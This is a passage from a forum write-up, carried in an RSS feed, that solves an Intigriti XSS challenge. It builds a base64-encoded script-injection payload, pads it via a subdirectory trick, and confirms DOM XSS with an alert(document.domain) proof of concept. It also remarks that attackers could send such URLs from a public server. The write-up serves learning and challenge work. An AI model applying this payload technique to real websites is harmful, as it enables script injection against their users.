&lt;/a&gt;
</code></pre>
<p>See what I did there? <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>The last thing remaining is to generate a B64 string that, when decoded, would generate the string mentioned. Using any B64 encoder we get:</p>
<pre><code class="lang-auto">Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=
</code></pre>
<p>Let’s try to rename our 0x00sec image file to this name. The resulting url will be:<br>
<a href="http://challenge.intigriti.io/2#//2130706433/Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=" class="onebox" target="_blank" rel="noopener nofollow ugc">http://challenge.intigriti.io/2#//2130706433/Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=</a></p>
<p>Hmmm… we got the <code>atob</code> error again, but we know how to solve it!! We just have to pad the string to a valid length. Let’s try adding a subdirectory to our server root dir:</p>
<pre><code class="lang-auto">http://challenge.intigriti.io/2#//2130706433/aa/Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=
                                            ^^^
</code></pre>
<p>We then save the renamed 0x00sec image inside the <code>/aa/</code> directory. Let’s try it again!</p>
<p><a href="http://challenge.intigriti.io/2#//2130706433/aa/Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=" class="onebox" target="_blank" rel="noopener nofollow ugc">http://challenge.intigriti.io/2#//2130706433/aa/Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=</a></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/56c119d248289e90e0cace75c67a7562c2f52121.jpeg" alt="xss_5" data-base62-sha1="cnsMj47FlDQqSIZJcCO73JCivWF" width="690" height="358"></p>
<p>And there you have it! We successfully injected and executed JS code into the web page. We can check the html code generated to confirm this:</p>
<pre><code class="lang-auto">&lt;a href="//2130706433/aa/Ij48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=" alt="ÿýµßNôë÷ý¦¿"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;"&amp;gt;
    &lt;img src="data:application/octet-stream;base64, iVBORw0KGgoAAAANSUhEUgAAA..."&gt;
&lt;/a&gt;
</code></pre>
<p>There it is! This type of XSS is known as DOM XSS. You can read more about XSS and different types of XSS <a href="https://excess-xss.com" rel="noopener nofollow ugc">here</a>.</p>
<p>But why would this challenge be of any harm if it were to happen in the wild? How could hackers attack it? Well, it would be as easy as creating your own public server, accessible from anywhere. Once you accomplished that, you could send the infectious URL containing the XSS payload (<em>with your server address, not localhost!</em>) to anyone.</p>
<p>Phew! That was it! I really enjoyed solving it and I’m looking forward to future challenges. I hope this write-up makes sense! Feel free to comment/ask/suggest anything in the comments section <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>See you around,<br>
~hasp0t</p>
          <p><a href="https://0x00sec.org/t/intigriti-xss-challenge-solution/13896/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/intigriti-xss-challenge-solution/13896/1</link>
        <pubDate>Sat, 25 May 2019 14:47:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13896-1</guid>
        <source url="https://0x00sec.org/t/intigriti-xss-challenge-solution/13896.rss">Intigriti XSS Challenge - Solution</source>
      </item>
  </channel>
</rss>
